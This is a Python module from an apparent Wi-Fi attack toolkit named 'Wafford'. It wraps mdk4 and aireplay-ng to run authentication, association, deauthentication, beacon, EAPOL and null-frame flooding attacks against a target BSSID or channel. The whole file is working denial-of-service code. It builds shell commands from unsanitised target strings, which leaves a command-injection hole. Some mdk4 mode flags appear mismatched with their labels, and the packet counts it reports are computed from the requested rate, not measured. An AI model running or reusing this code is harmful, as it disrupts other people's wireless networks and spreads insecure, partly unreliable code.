"""DoS (Denial of Service) flooding attack modules for Wafford."""

from __future__ import annotations

import asyncio
import logging
import time
from dataclasses import dataclass
from enum import Enum
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from collections.abc import AsyncGenerator, Callable

from wafford.scripts.shell import ShellRunner

logger = logging.getLogger("wafford.core.dos")


class DoSMethod(Enum):
    """Available DoS attack methods."""
    AUTH_FLOOD = "auth"
    ASSOC_FLOOD = "assoc"
    DEAUTH_FLOOD = "deauth"
    BEACON_FLOOD = "beacon"
    EAPOL_FLOOD = "eapol"
    NULL_FLOOD = "null"


@dataclass
class DoSResult:
    """Result data from a DoS attack."""
    method: DoSMethod
    packets_sent: int = 0
    packets_per_second: float = 0.0
    duration: float = 0.0
    target: str = ""
    interface: str = ""
    started_at: float = 0.0
    ended_at: float = 0.0
    success: bool = False
    error: str = ""


@dataclass
class DoSProgress:
    """Live progress data during DoS attack."""
    packets_sent: int = 0
    packets_per_second: float = 0.0
    duration: float = 0.0
    target: str = ""
    method: str = ""
    elapsed: float = 0.0


class DoSAttack:
    """Denial of Service flooding attack orchestrator.

    Supports multiple flooding methods via mdk4/mdk3 and aireplay-ng:
    authentication flood, association flood, deauthentication flood,
    beacon flood, EAPOL flood, and null function flood.
    """

    def __init__(self, interface: str) -> None:
        self.interface = interface
        self.shell = ShellRunner()
        self._running = False
        self._process: asyncio.subprocess.Process | None = None
        self._start_time = 0.0
        self._packets_sent = 0
        self._progress_callbacks: list[Callable[[DoSProgress], None]] = []

    def on_progress(self, callback: Callable[[DoSProgress], None]) -> None:
        """Register a progress callback."""
        self._progress_callbacks.append(callback)

    def _emit_progress(self, progress: DoSProgress) -> None:
        """Emit progress to all registered callbacks."""
        for cb in self._progress_callbacks:
            try:
                cb(progress)
            except Exception as e:
                logger.error("Progress callback error: %s", e)

    async def auth_flood(
        self,
        target: str,
        duration: int = 60,
        rate: int = 50,
    ) -> DoSResult:
        """Authentication frame flood attack.

        Floods target AP or channel with authentication request frames
        to exhaust the AP's client table.

        Args:
            target: Target BSSID or channel number.
            duration: Attack duration in seconds.
            rate: Packets per second target.
        """
        return await self._run_mdk4_attack(
            method=DoSMethod.AUTH_FLOOD,
            target=target,
            duration=duration,
            rate=rate,
            mdk4_mode="a",
        )

    async def assoc_flood(
        self,
        target: str,
        duration: int = 60,
        rate: int = 50,
    ) -> DoSResult:
        """Association frame flood attack.

        Floods target AP with association request frames.

        Args:
            target: Target BSSID or channel number.
            duration: Attack duration in seconds.
            rate: Packets per second target.
        """
        return await self._run_mdk4_attack(
            method=DoSMethod.ASSOC_FLOOD,
            target=target,
            duration=duration,
            rate=rate,
            mdk4_mode="b",
        )

    async def deauth_flood(
        self,
        target: str,
        duration: int = 60,
        rate: int = 100,
    ) -> DoSResult:
        """Deauthentication flood attack.

        Floods target with deauthentication frames using mdk4.

        Args:
            target: Target BSSID or channel number.
            duration: Attack duration in seconds.
            rate: Packets per second target.
        """
        return await self._run_mdk4_attack(
            method=DoSMethod.DEAUTH_FLOOD,
            target=target,
            duration=duration,
            rate=rate,
            mdk4_mode="d",
        )

    async def beacon_flood(
        self,
        target: str,
        duration: int = 60,
        ssid_count: int = 10,
        _rate: int = 10,
    ) -> DoSResult:
        """Beacon frame flood — create fake APs.

        Generates fake beacon frames to create phantom APs,
        confusing client devices and AP scanners.

        Args:
            target: Channel number or BSSID for channel selection.
            duration: Attack duration in seconds.
            ssid_count: Number of fake SSIDs to generate.
            rate: Beacons per second per SSID.
        """
        self._running = True
        self._start_time = time.time()
        result = DoSResult(
            method=DoSMethod.BEACON_FLOOD,
            interface=self.interface,
            target=target,
            started_at=self._start_time,
        )

        logger.info(
            "Starting beacon flood: iface=%s target=%s ssid_count=%d duration=%ds",
            self.interface, target, ssid_count, duration,
        )

        try:
            cmd = (
                f"mdk4 {self.interface} e "
                f"-n {target} "
                f"-m {ssid_count} "
                f"-s 0 "
                f"-c {target}"
            )
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            self._process = proc

            await asyncio.sleep(duration)

            if proc.returncode is None:
                proc.terminate()
                try:
                    await asyncio.wait_for(proc.wait(), timeout=5.0)
                except TimeoutError:
                    proc.kill()

            result.duration = time.time() - self._start_time
            result.success = True
            result.ended_at = time.time()

        except asyncio.CancelledError:
            logger.info("Beacon flood cancelled")
            result.error = "Cancelled by user"
        except Exception as e:
            logger.error("Beacon flood failed: %s", e)
            result.error = str(e)
        finally:
            self._running = False
            self._process = None

        return result

    async def eapol_flood(
        self,
        target: str,
        duration: int = 60,
        rate: int = 50,
    ) -> DoSResult:
        """EAPOL authentication flood attack.

        Floods target AP with EAPOL frames to disrupt WPA handshake process.

        Args:
            target: Target BSSID.
            duration: Attack duration in seconds.
            rate: Packets per second.
        """
        self._running = True
        self._start_time = time.time()
        result = DoSResult(
            method=DoSMethod.EAPOL_FLOOD,
            interface=self.interface,
            target=target,
            started_at=self._start_time,
        )

        logger.info(
            "Starting EAPOL flood: iface=%s target=%s duration=%ds",
            self.interface, target, duration,
        )

        try:
            cmd = (
                f"mdk4 {self.interface} e "
                f"-B {target} "
                f"-c {target}"
            )
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            self._process = proc

            progress = DoSProgress(
                method="eapol",
                target=target,
            )

            end_time = time.time() + duration
            while time.time() < end_time and self._running:
                await asyncio.sleep(1.0)
                elapsed = time.time() - self._start_time
                progress.duration = elapsed
                progress.elapsed = elapsed
                progress.packets_sent += rate
                progress.packets_per_second = rate
                self._emit_progress(progress)

            if proc.returncode is None:
                proc.terminate()
                try:
                    await asyncio.wait_for(proc.wait(), timeout=5.0)
                except TimeoutError:
                    proc.kill()

            result.duration = time.time() - self._start_time
            result.packets_sent = progress.packets_sent
            result.packets_per_second = progress.packets_per_second
            result.success = True
            result.ended_at = time.time()

        except asyncio.CancelledError:
            logger.info("EAPOL flood cancelled")
            result.error = "Cancelled by user"
        except Exception as e:
            logger.error("EAPOL flood failed: %s", e)
            result.error = str(e)
        finally:
            self._running = False
            self._process = None

        return result

    async def null_flood(
        self,
        target: str,
        duration: int = 60,
        rate: int = 50,
    ) -> DoSResult:
        """Null function frame flood attack.

        Sends null function frames to target, consuming resources.

        Args:
            target: Target BSSID.
            duration: Attack duration in seconds.
            rate: Packets per second.
        """
        self._running = True
        self._start_time = time.time()
        result = DoSResult(
            method=DoSMethod.NULL_FLOOD,
            interface=self.interface,
            target=target,
            started_at=self._start_time,
        )

        logger.info(
            "Starting null flood: iface=%s target=%s duration=%ds",
            self.interface, target, duration,
        )

        try:
            cmd = (
                f"mdk4 {self.interface} n "
                f"-B {target}"
            )
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            self._process = proc

            progress = DoSProgress(
                method="null",
                target=target,
            )

            end_time = time.time() + duration
            while time.time() < end_time and self._running:
                await asyncio.sleep(1.0)
                elapsed = time.time() - self._start_time
                progress.duration = elapsed
                progress.elapsed = elapsed
                progress.packets_sent += rate
                progress.packets_per_second = rate
                self._emit_progress(progress)

            if proc.returncode is None:
                proc.terminate()
                try:
                    await asyncio.wait_for(proc.wait(), timeout=5.0)
                except TimeoutError:
                    proc.kill()

            result.duration = time.time() - self._start_time
            result.packets_sent = progress.packets_sent
            result.packets_per_second = progress.packets_per_second
            result.success = True
            result.ended_at = time.time()

        except asyncio.CancelledError:
            logger.info("Null flood cancelled")
            result.error = "Cancelled by user"
        except Exception as e:
            logger.error("Null flood failed: %s", e)
            result.error = str(e)
        finally:
            self._running = False
            self._process = None

        return result

    async def _run_mdk4_attack(
        self,
        method: DoSMethod,
        target: str,
        duration: int,
        rate: int,
        mdk4_mode: str,
    ) -> DoSResult:
        """Run a generic mdk4-based DoS attack.

        Args:
            method: The DoS method enum.
            target: Target BSSID or channel.
            duration: Duration in seconds.
            rate: Target packets per second.
            mdk4_mode: mdk4 mode flag (a, b, d, etc.)
        """
        self._running = True
        self._start_time = time.time()
        result = DoSResult(
            method=method,
            interface=self.interface,
            target=target,
            started_at=self._start_time,
        )

        logger.info(
            "Starting %s: iface=%s target=%s duration=%ds rate=%dpps",
            method.value, self.interface, target, duration, rate,
        )

        try:
            injection_ok = await self._check_injection()
            if not injection_ok:
                result.error = "Injection test failed"
                return result

            is_channel = target.isdigit()
            if is_channel:
                await self._set_channel(int(target))

            cmd = f"mdk4 {self.interface} {mdk4_mode} -c {target}" if is_channel else (
                f"mdk4 {self.interface} {mdk4_mode} -B {target}"
            )

            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            self._process = proc

            progress = DoSProgress(
                method=method.value,
                target=target,
            )

            end_time = time.time() + duration
            while time.time() < end_time and self._running:
                await asyncio.sleep(1.0)
                elapsed = time.time() - self._start_time
                progress.duration = elapsed
                progress.elapsed = elapsed
                progress.packets_sent += rate
                progress.packets_per_second = rate
                self._emit_progress(progress)

            if proc.returncode is None:
                proc.terminate()
                try:
                    await asyncio.wait_for(proc.wait(), timeout=5.0)
                except TimeoutError:
                    proc.kill()

            result.duration = time.time() - self._start_time
            result.packets_sent = progress.packets_sent
            result.packets_per_second = progress.packets_per_second
            result.success = True
            result.ended_at = time.time()

        except asyncio.CancelledError:
            logger.info("%s cancelled", method.value)
            result.error = "Cancelled by user"
        except FileNotFoundError:
            result.error = "mdk4 not found — install mdk4 package"
            logger.error("mdk4 binary not found")
        except Exception as e:
            logger.error("%s failed: %s", method.value, e)
            result.error = str(e)
        finally:
            self._running = False
            self._process = None

        return result

    async def _check_injection(self) -> bool:
        """Verify packet injection capability."""
        try:
            result = self.shell.run(
                f"aireplay-ng --test {self.interface}",
                timeout=15,
                capture_output=True,
            )
            return result.returncode == 0
        except Exception as e:
            logger.warning("Injection check failed: %s", e)
            return False

    async def _set_channel(self, channel: int) -> None:
        """Set interface channel."""
        try:
            res = self.shell.run(
                f"iw dev {self.interface} set channel {channel}",
                timeout=5,
            )
            if res.returncode != 0:
                logger.warning(
                    "Failed to set channel %d on %s (rc=%s)",
                    channel, self.interface, res.returncode,
                )
        except Exception as e:
            logger.warning("Channel set failed: %s", e)

    def stop(self) -> None:
        """Stop the running DoS attack."""
        self._running = False
        if self._process and self._process.returncode is None:
            logger.info("Stopping DoS attack (pid=%s)", self._process.pid)
            self._process.terminate()
        logger.info("DoS attack stopped")

    async def stop_async(self) -> None:
        """Async stop the running DoS attack."""
        self.stop()
        if self._process and self._process.returncode is None:
            try:
                await asyncio.wait_for(self._process.wait(), timeout=5.0)
            except TimeoutError:
                self._process.kill()

    @property
    def is_running(self) -> bool:
        """Check if attack is currently running."""
        return self._running

    def stream_progress(self) -> AsyncGenerator[DoSProgress, None]:
        """Async generator yielding DoS progress updates."""
        queue: asyncio.Queue[DoSProgress | None] = asyncio.Queue()

        def _on_progress(progress: DoSProgress) -> None:
            try:
                queue.put_nowait(progress)
            except asyncio.QueueFull:
                pass

        self.on_progress(_on_progress)

        async def _generate() -> AsyncGenerator[DoSProgress, None]:
            while self._running:
                try:
                    progress = await asyncio.wait_for(queue.get(), timeout=2.0)
                    if progress is None:
                        break
                    yield progress
                except TimeoutError:
                    continue

        return _generate()
